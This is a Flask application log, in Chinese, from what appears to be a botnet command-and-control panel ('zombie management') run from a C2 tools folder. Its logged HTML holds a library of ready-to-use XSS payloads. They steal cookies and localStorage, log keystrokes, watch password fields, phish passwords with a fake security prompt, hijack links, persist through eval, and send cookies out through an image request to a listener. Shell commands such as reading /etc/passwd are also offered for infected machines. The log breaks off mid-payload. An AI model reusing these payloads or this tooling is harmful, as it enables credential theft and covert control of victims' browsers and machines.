2025-06-28 13:36:46 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-28 13:36:46 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-28 13:36:46 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 13:36:46 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 13:36:46 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:6666
2025-06-28 13:36:46 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-28 23:21:27 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 23:21:27 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 23:21:27 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 23:21:27 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 23:21:27 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 23:21:27 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 23:21:27 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 23:21:27 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 23:21:27 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 23:21:27 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 83773
2025-06-28 23:21:41 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-28 23:21:41 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-28 23:21:41 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 23:21:41 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 23:21:41 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:6666
 * Running on http://172.20.10.2:6666
2025-06-28 23:21:41 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-28 23:39:22 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 23:39:22 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 23:39:22 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 23:39:22 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 23:39:22 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 23:39:22 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 23:39:22 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 23:39:22 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 23:39:22 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 23:39:22 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 85526
2025-06-28 23:39:26 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-28 23:39:26 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-28 23:39:26 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 23:39:26 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 23:39:26 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:1337
 * Running on http://172.20.10.2:1337
2025-06-28 23:39:26 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-28 23:39:31 | ERROR    | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:31] code 400, message Bad request version ('kþ\x80bdc·\x0e}Ïp69,LÔ\x8eºD[(\x9brª1¨Èèz¤\x1aM')
2025-06-28 23:39:31 | INFO     | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:31] "[31m[1m\x16\x03\x01\x07\x00\x01\x00\x06ü\x03\x03\x8cÃInÓÞ\x82\x9dÄyh\x7fD\x04Ì\x866PäÝ¶\x8fÍ¸<\x1d\x8cÜ`4\x9fb &»fìó=Û\x1bH?\x1d\x1f\x00\x99¹\x91<JïA\x8fÚ\x1aÑ<ýo\x93\x9d¶«\x9c\x00 ZZ\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06\x93\x9a\x9a\x00\x00\x00-\x00\x02\x01\x01\x00#\x00\x00ÿ\x01\x00\x01\x00þ\x0d\x01\x1a\x00\x00\x01\x00\x011\x00 6»\x05ð\x1dÉXCü¨\x88ª,j\x11\x03Câ\x96@î\x9c%Æ\x03½ö\x01\x19°L\x11\x00ðd.JE\x87l\x93ØEÓ$`©¦)\x99d3n®\x17Õ\x88\x9bñZ°uM\x0cèódX\x8d\x95ú\x13¿Ì[Và¨L6bDmú¬´é\x1fkþ\x80bdc·\x0e}Ïp69,LÔ\x8eºD[(\x9brª1¨Èèz¤\x1aM[0m" 400 -
2025-06-28 23:39:31 | ERROR    | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:31] code 400, message Bad request version ('\x8c³?å4V2²G')
2025-06-28 23:39:31 | INFO     | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:31] "[31m[1m\x16\x03\x01\x06À\x01\x00\x06¼\x03\x03Õ\x05|\x91Õé¼±}\x8e\x15<¶1v\x1c<k2P'¹Bl³Èh[­¬f\x03 ¸\x00\x14ÄÓõÝB«¥ëÊ\x1b\x1f¨+uoÁ|\x8a\x12\x13\x8fB7B\x17\x92jS¼\x00 êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x06Sêê\x00\x00DÍ\x00\x05\x00\x03\x02h2\x00\x05\x00\x05\x01\x00\x00\x00\x00\x003\x04ï\x04íjj\x00\x01\x00\x11ì\x04Àï\x96bttÃÃ\x14]ªji\x92ä7\x1341?\x85° \x13\x06^w\x88zã\x99r·\x8d\x91yÄÚ\x86\x81þ8¸\x02\x0b¸\x94û¨(Fµi2\x0d\x8c³?å4V2²G[0m" 400 -
2025-06-28 23:39:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-28 23:39:32 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-28 23:39:32 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-28 23:39:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0312s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-28 23:39:32 | INFO     | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:32] "GET / HTTP/1.1" 200 -
2025-06-28 23:39:32 | INFO     | _internal.py:97 | _log() | 172.20.10.2 - - [28/Jun/2025 23:39:32] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-28 23:43:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-28 23:43:31 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-28 23:43:31 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-28 23:43:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0013s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-28 23:43:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:31] "GET / HTTP/1.1" 200 -
2025-06-28 23:43:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-28 23:43:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-28 23:43:33 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-28 23:43:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0063s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; 